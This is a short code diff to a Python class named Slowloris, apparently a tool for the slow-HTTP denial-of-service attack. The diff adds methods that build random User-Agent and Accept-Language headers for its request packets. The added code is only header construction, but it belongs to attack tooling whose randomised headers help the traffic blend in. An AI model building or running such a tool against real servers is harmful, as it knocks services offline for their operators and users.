@@ -247,10 +247,21 @@ class Slowloris:
         f"{DefaultHttpParameters.Requests.lambda_get_requests(randint(0, 2000))}\r\n"
         
         return packet.encode("utf-8")
+    
+    def create_usr_agent_header(self) -> bytes:
+        """return the header for user-agent value"""
+        
+        packet = f"User-Agent: {choice(DefaultHttpParameters.Headers.user_agents)}\r\n"
+        return packet.encode("utf-8")
+
+    def create_accept_language_header(self) -> bytes:
+        """return the header for Accept-language"""
+        
+        packet = f"Accept-language: {DefaultHttpParameters.Headers.accept_language}\r\n"
+        return packet.encode("utf-8")
+
         
         
-
-
 if __name__ == "__main__":
     
     get_parameter()
